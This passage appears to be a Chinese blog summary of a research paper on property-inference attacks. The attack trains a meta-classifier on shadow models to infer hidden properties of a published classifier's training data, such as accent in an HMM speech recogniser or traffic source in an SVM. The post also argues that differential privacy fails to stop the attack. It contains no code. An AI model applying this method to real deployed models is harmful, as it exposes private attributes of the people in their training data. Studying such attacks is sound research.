ha_1,a_2,...,a_{ni}})(a,l)∣a=ha1​,a2​,...,ani​)。每个训练元素a表示为nnn个特征的向量，并且具有相关联的标记lll。通过对数据集DDD进行训练，可以由此得到分类器CCC（训练的算法可以是ANN,HMM,DT）。由前述可知，当一个分类器CCC被公开时，就意味着攻击者就能得到分类器的算法以及其副本。此外，每一个分类器都可以用一组特征向量FcF_cFc​来表示（正如在支持向量机中，除了支持向量以外其他向量前的系数都为0，因此支持向量机可以仅用支持向量来训练而不带来任何改变）。我们可以利用以上性质来攻击一个分类器。 如下图所示，为攻击一个分类器获取隐含信息的流程图: 攻击者想要获得关于训练集DxD_xDx​的某些属性PPP（属性PPP的一个举例为：训练样本的男性和女性的项目大致相等），因为攻击者仅仅能获取到分类器CxC_xCx​，而不知道具体的训练集DxD_xDx​，因此需要设计一个元分类器MCMCMC。元分类器MCMCMC的构建步骤如下： 1.攻击者构建一系列数据集D1,D2,D3,……,DnD_1,D_2,D_3,……,D_nD1​,D2​,D3​,……,Dn​，每个数据集都有一个对应的属性PPP和PPP非，属性的确定则是根据数据集中的各个元素的标签来确定（例如一个数据集中所有元素的标签都是男性，那么数据集的男女项目就不是大致相等，故该数据集的属性为PPP非，另外PPP也就是攻击者想要从训练样本获得的信息）。攻击者选用的一系列数据集中将近一半带有属性PPP，另一半带有属性PPP非。 2.攻击者分别将这些数据集用某一个特定的算法训练获得一系列对应的分类器C1,C2,C3,…,CnC_1,C_2,C_3,…,C_nC1​,C2​,C3​,…,Cn​。 3.如前文所述，一个分类器可以由一组特征向量Fc来表示，攻击者可以从这一系列分类器中得到多组特征向量Fc1,Fc2,Fc3,……,FcnF_{c1},F_{c2},F_{c3},……,F_{cn}Fc1​,Fc2​,Fc3​,……,Fcn​。因为一个特征向量的结构和数据集中包含的元素相同，为(a,l)∣a=ha1,a2,...,ani{(a,l)|a =h_{a1},a_2,...,a_{ni}}(a,l)∣a=ha1​,a2​,...,ani​，攻击者取出每个特征向量的训练元素aaa，并附上标签lil_ili​（这个标签为DiD_iDi​的属性PPP或者PPP非），组成一个新的数据集Dc​D_c​Dc​​。 4.用新的数据集DcD_cDc​用算法训练出元分类器MCMCMC，因为新的数据集是以新的标签PPP和PPP非来训练的，因此可以通过输入一个元素aaa来测试该点属于哪一个标签类型。 5.攻击者已知分类器CxC_xCx​，可以从中推出其特征向量组FcxF_{cx}Fcx​，将向量组中的各个特征向量的元素aaa输入到元分类器MCMCMC中，可以得到这些元素的标签。经过统计后，攻击者就可以知道训练集DxD_xDx​是否具有属性P。 下图为训练元分类器MC的伪代码： 实现原理 该论文通过攻击两个模型：基于隐式马尔科夫链的语音识别系统、基于支持向量机的互联网流量交换分类器来具体说明了前述的攻击方法。 在引入这两个具体应用前，论文先介绍了一下使用这些方法所需要的一些背景知识，再结合查阅相关资料，可以总结如下： HMM（隐式马尔科夫模型） 隐式马尔科夫模型主要是用来表示实际输出背后的概率模型。可以通过掷骰子来形象理解，通过随机选择投掷四面，六面和八面骰子，投掷出的点数作为输出。连续投掷多次，其中掷骰子掷出的点数就是可见状态链，每次投掷的哪种骰子就是隐含状态链。在一个三状态的隐式马尔科夫模型中： 其中三个状态可以理解为抛掷的三个骰子，aija_{ij}aij​为抛掷骰子iii后下一个抛骰子jjj的概率。图中的ooo就是实际的可见输出，也就是抛出的点数。这里面有两个重要的等式: P(xi=qj∣x1,x2,...,xi−1)=P(xi=qj∣xi−1)P(x_i=q_j|x_1,x_2,...,x_{i-1})=P(x_i=q_j|x_{i-1})P(xi​=qj​∣x1​,x2​,...,xi−1​)=P(xi​=qj​∣xi−1​) 这个等式说明下一次隐变量的概率只和上一隐变量的值有关，而与之前的无关 P(yi=ok∣x1,...,xi,...,xT,y11,...,yT)=P(ok∣qj)P(y_i=o_k|x_1,...,x_i,...,x_T,y_11,...,y_T)=P(o_k|q_j)P(yi​=ok​∣x1​,...,xi​,...,xT​,y1​1,...,yT​)=P(ok​∣qj​) 这个等式说明当前的输出只与当前的隐变量有关，而与其他值无关 MFCCs（梅尔频率倒谱系数） MFCCs在语音识别系统中具有很重要的作用，要理解MFCCs首先需要知道人的声音是通过声道产生的，而其中声道由舌头牙齿气管等一系列组成。如果我们知道了声道的具体细节，就能知道一个人发出一个特定音素(phonemes)产生的声音。这就像一个黑箱系统，其中音素是系统的输入信号，声音就是输出信号。而其中声道的形状在语音短时功率谱的包络中显示出来。而MFCCs就是一种准确描述这个包络的一种特征。 先说明一下倒谱分析，在对一个声音信号进行短时FFTFFTFFT变换后，其频谱信号的峰值（共振峰）以及其变换趋势相当于一个声道的辨识属性。但其中还包含了一系列小噪声，我们的目的是滤除小噪声而保留包络。已知包络信号一般是低频信号而小噪声为高频信号，要将他们分离可以对频谱信号取对数。在频谱中包络和小信号原来是相乘关系，当取对数后则变成了相加关系。最后将信号做IFFT​IFFT​IFFT​变换，显然将两者分离了，这就是倒谱分析。其直观的流程如下： 然后MFCCs其实是在倒谱基础上加上了一个Mel滤波，这是将频谱根据人的听力在不同频率上的变化来特别设计的一个滤波器。还有一点不同的是MFCCs在IDFTIDFTIDFT上所做的是DCTDCTDCT（离散余弦变换），最后取第2到第13个系数作为MFCC系数，这个就是论文中从VoxForge得到的文件。 概述 先介绍攻击基于隐式马尔科夫链的语音识别系统的方法，根据前文可知，攻击者攻击一个分类器过程中最主要的目标是构建一个元分类器。在此攻击中假设攻击者最想要获取的信息P为：训练样本只用了使用印度方言的英语来训练。在本实验中，可以从VoxForge上下载音源文件，在该网站下载的音源文件附带了文件的元信息（例如性别，年龄和口音等）。元信息就相当于前述的样本标记，可用于分类训练。 首先对于训练过程，我们是知道一段语音所表示的句子的，我们可以将句子分词，再分成每个音素。以每个音素为帧对语音信号做变化，得到MFCCs。其中MFCCs就相当于在HMM中的可见量，其对应的隐变量就相当于对应的音素。通过对训练集中各个音素的MFCC统计，可以得到其MFCC向量中各个值的平均值和方差。而隐变量之间的转移概率矩阵和输出概率可以通过Viterbi算法在很多语音集上的统计得到。将训练集DDD通过以上方法训练得到CCC，其实CCC就是一个在HTK中用ASCII文件表示的每个音素的HMM，其中HMM有转移矩阵A(n∗n)A(n*n)A(n∗n)，并且每一个隐变量都有两个向量M,VM,VM,V分别来表示输出的均值和方差。知道了CCC我们就可以从CCC中取得特征向量，在这里特征向量被定义为： a=(ph,µ1,µ2,...,µm,σ1,σ2,...,σm,li)a = (p_h,µ_1,µ_2,...,µ_m,σ_1,σ_2,...,σ_m,l_i)a=(ph​,µ1​,µ2​,...,µm​,σ1​,σ2​,...,σm​,li​) 其中php_hph​指的是该特征向量所代表的音素，µ1,µ2,...,µmµ_1,µ_2,...,µ_mµ1​,µ2​,...,µm​和σ1,σ2,...,σmσ_1,σ_2,...,σ_mσ1​,σ2​,...,σm​指输出均值和方差。LiL_iLi​就是这一向量的标记，如印度口音和非印度口音。 我们的DcD_cDc​包括了5420个元组，这些组有一半带有印度口音，另一半没有印度口音，这些元组是用来模拟各个分类器的特征向量，将得到的特征向量全部加入到DcD_cDc​中用来训练MC​MC​MC​。这里用决策树的算法训练出了一颗带有811个节点和610个叶子的决策树。最后我们用1016个元组来作为待破解分类器的特征向量来检验该攻击方法的可靠性，元分类器分类结果的精确度和召回率如下图： 可见分类的效果良好。 另外，可以采用过滤的方法构造一个效果更好的元分类器。元分类器在本实验中是一棵决策树，其中最有代表性的节点是σ2σ_2σ2​，对所有DcD_cDc​中音素的σ2σ_2σ2​值进行统计，可见如下图标： 可见两个类别的均值有比较大的区别，可以很容易地区分，因为两者的σ2是呈正态分布的，两者有部分重叠，这个部分上就对分类造成了混淆。我们过滤的作用就是从Dc中提取那些容易区分口音的音素。在这里我们用到了KL分歧算法，该算法定义如下： DKL(P∣∣Q)=∑iP(i)logP(i)Q(i)D_{KL}(P||Q)=\sum_iP(i)log\frac{P(i)}{Q(i)}DKL​(P∣∣Q)=∑i​P(i)logQ(i)P(i)​ 如果当P,Q都为正态分布时，该算式就可以表示为： DKL(Xi∣∣Xj)=(μi−μj)22σi2+12(σi2σj2−1−lnσi2σj2)D_{KL}(X_i||X_j)=\frac{(\mu_i-\mu_j)^2}{2\sigma^2_i}+\frac{1}{2}(\frac{\sigma_i^2}{\sigma_j^2}-1-ln\frac{\sigma_i^2}{\sigma_j^2})DKL​(Xi​∣∣Xj​)=2σi2​(μi​−μj​)2​+21​(σj2​σi2​​−1−lnσj2​σi2​​) DklD_{kl}Dkl​值越大代表两者越不相同，反之则差异越小。在声学模型中选取100个没有印度口音的模型C=(C1,C2,...,C100)C = (C_1,C_2,...,C_{100})C=(C1​,C2​,...,C100​)，再选取一个用于参考的印度口音的声学模型CrC_rCr​。因为每个声学模型中有每个音素的特征向量，用印度口音的声学模型某个音素的特征向量与对应的每一个非印度口音中声学模型的特征向量求KLKLKL分歧值。最后我们选取值最大的5个音素，在DcD_cDc​中剔除除了这5个音素的特征向量，再次训练MCMCMC，所得到的效果相比上次有所改善。 在攻击基于支持向量机的互联网流量交换分类器的例子中，选取了70个特别指定的数据站，在其中选取20000条网络流量记录。在所有的网络流量记录中都没有DNS流量。根据数据站点的不同，将网络流量记录分成70份，在选取数据的过程中，要求有35个站点的WEB流量直接经过谷歌搜索引擎（属性P）。对于剩下的35个站点，其中的WEB流量不直接通过谷歌搜索引擎（属性P非）。显然在该例子中，这70个站点相当于70个数据集，该数据集根据其属性P和P非被分成均等的两类，再用SVM算法分别训练这70个数据集得到分类器。同时我们可以从这些分类器中提取支持向量并加上属性P或者P非，将其加入到DcD_cDc​中，DcD_cDc​中的成分如下： Dc=Uci{(y,&lt;x&gt;,label)}D_c=U_{c_i}\{(y,&lt;x&gt;,label)\}Dc​=Uci​​{(y,&lt;x&gt;,label)} 最后用Dc作为训练样本得到元分类器MC，该实验中为了得到分类器Cx的支持向量，采用交叉验证的方法来模拟得出。最终可以得到该元分类器的精确度和召回率： 从中可以看出我们可以构建一个元分类器来推断训练样本是否是特定种类的流量。 差分隐私 本论文指出差分隐私对我们的攻击策略无效，我们所专注的信息泄露和攻击者所考虑的模型不一样。差分隐私保护可以最大限度地减小识别其记录的机会，最大化数据查询的准确性，为了保护数据库几率的隐私，有三种方法： 1.首先是混淆原数据集D为D’，这个对我们的攻击完全无效，因为在训练模型时实际使用的是D’，攻击者实际的攻击时建立在分析训练完成的模型C上。 2.另一种途径是训练一个分类器并且在输出添加噪声。这个方法也是对我们的破解无效，因为我们是通过分析分类器来进行攻击的，在输出端增加噪声没有什么用。 3.第三种方式通过在训练过程中增加噪声，这种方式也是无效的，因为最终的分类器应该趋向于正确分类训练集，因此噪声在某种程度上需要被抑制，由此我们可以减轻噪声对我们破解产生的影响。 ​ 在接下来，论文通过用K-Means算法来训练之前支持向量机所用的数据，并得出了添加差分隐私保护并不能防御我们这种攻击。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>深度学习</tag>
        <tag>安全</tag>
      </tags>
  </entry>
</search>
